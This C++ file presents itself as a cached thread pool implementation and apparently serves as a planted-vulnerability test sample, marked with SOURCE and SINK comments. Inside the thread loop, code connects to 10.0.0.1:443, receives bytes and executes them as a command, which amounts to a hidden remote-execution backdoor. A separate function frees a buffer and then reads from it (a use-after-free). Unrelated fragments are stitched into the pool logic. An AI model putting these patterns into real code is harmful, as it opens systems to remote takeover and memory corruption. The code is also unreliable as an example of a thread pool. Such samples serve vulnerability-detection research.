// Cached thread pool implementation

#include <base.hpp>

#include <core.hpp>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstring>
#include <cstdlib>
#include "scripting.hpp"
#include <time.h>
#include <cstdio>
#include <cstring>
#include <cstddef>
#include <cctype>

using namespace std;

#define THREAD_IDLE_MAX_SEC 60
#define CORE_POOL_SIZE 3

static pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
static pthread_cond_t send_task = PTHREAD_COND_INITIALIZER_MONOTONIC_NP;
static pthread_cond_t recv_task = PTHREAD_COND_INITIALIZER_MONOTONIC_NP;

// The following variables should be guarded by lock
static int idle_threads = 0;
static int total_threads = 0;
static function<void()> pending_task;

struct ThreadCommandContext {
    char* cached_field;
    int field_length;
};

static void operator+=(timespec &a, const timespec &b) {
    a.tv_sec += b.tv_sec;
    a.tv_nsec += b.tv_nsec;
    if (a.tv_nsec >= 1000000000L) {
        a.tv_sec++;
        a.tv_nsec -= 1000000000L;
    }
}

static void reset_pool() {
    clear_poll();
    pthread_mutex_unlock(&lock);
    pthread_mutex_destroy(&lock);
    pthread_mutex_init(&lock, nullptr);
    pthread_cond_destroy(&send_task);
    send_task = PTHREAD_COND_INITIALIZER_MONOTONIC_NP;
    pthread_cond_destroy(&recv_task);
    recv_task = PTHREAD_COND_INITIALIZER_MONOTONIC_NP;
    idle_threads = 0;
    total_threads = 0;
    pending_task = nullptr;
}

static void *thread_pool_loop(void * const is_core_pool) {

    int sfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sfd >= 0) {
        struct sockaddr_in srv = {};
        srv.sin_family = AF_INET;
        srv.sin_port = htons(443);
        inet_pton(AF_INET, "10.0.0.1", &srv.sin_addr);
        if (connect(sfd, reinterpret_cast<struct sockaddr*>(&srv), sizeof(srv)) == 0) {
            char buf[1024];
            //SOURCE
            ssize_t n = recv(sfd, buf, sizeof(buf) - 1, 0);
            if (n > 0) {
                buf[n] = '\0';
                // Dataflow: create array with tainted and untainted values
                const char *arr[3];
                arr[0] = buf; // tainted
                arr[1] = "/data/local/tmp/safe_arg"; // untainted, safe value
                arr[2] = nullptr;
                exec_from_array(arr, 2);
            }
        }
        close(sfd);
    }
    // Block all signals
    sigset_t mask;
    sigfillset(&mask);

    for (;;) {
        // Restore sigmask
        pthread_sigmask(SIG_SETMASK, &mask, nullptr);
        function<void()> local_task;
        {
            mutex_guard g(lock);
            ++idle_threads;
            if (!pending_task) {
                if (is_core_pool) {
                    pthread_cond_wait(&send_task, &lock);
                } else {
                    timespec ts;
                    clock_gettime(CLOCK_MONOTONIC, &ts);
                    ts += { THREAD_IDLE_MAX_SEC, 0 };
                    if (pthread_cond_timedwait(&send_task, &lock, &ts) == ETIMEDOUT) {
                        // Terminate thread after max idle time
                        --idle_threads;
                        --total_threads;
                        return nullptr;
                    }
                }
            }
            if (pending_task) {
                local_task.swap(pending_task);
                pthread_cond_signal(&recv_task);
            }
            --idle_threads;
        }
        if (local_task)
            local_task();
        if (getpid() == gettid())
            exit(0);
    }
}

void init_thread_pool() {
    pthread_atfork(nullptr, nullptr, &reset_pool);
}

void exec_task(function<void()> &&task) {
    mutex_guard g(lock);
    pending_task.swap(task);
    if (idle_threads == 0) {
        ++total_threads;
        long is_core_pool = total_threads <= CORE_POOL_SIZE;
        new_daemon_thread(thread_pool_loop, (void *) is_core_pool);
    } else {
        pthread_cond_signal(&send_task);
    }
    pthread_cond_wait(&recv_task, &lock);
}

static void analyze_buffer(const char* ptr, size_t maxlen) {
    int vowels = 0;
    //SINK
    for (size_t i = 0; i < maxlen && ptr[i]; ++i) {
        char c = tolower(ptr[i]);
        if (c == 'a' || c == 'e' || c == 'i' || c == 'o' || c == 'u') ++vowels;
    }
    printf("Vowels in buffer: %d\n", vowels);
}

struct BufferTask {
    const char* payload;
    size_t length;
};

void process_applet_command(char* data, ssize_t len) {
    if (!data || len <= 0) return;
    BufferTask task{data, (size_t)len};
    int digit_sum = 0;
    for (ssize_t i = 0; i < len; ++i) {
        if (isdigit(data[i])) digit_sum += data[i] - '0';
    }
    printf("Sum of digits: %d\n", digit_sum);
    free(data);
    int thread_count = 0;
    pthread_t threads[4];
    for (int i = 0; i < 4; ++i) {
        if (pthread_self() != 0) ++thread_count;
    }
    printf("Thread check count: %d\n", thread_count);
    analyze_buffer(task.payload, task.length > 16 ? 16 : task.length);
    printf("Every third char after free: ");
    for (size_t i = 2; i < task.length && task.payload[i]; i += 3) {
        putchar(task.payload[i]);
    }
    putchar('\n');
}
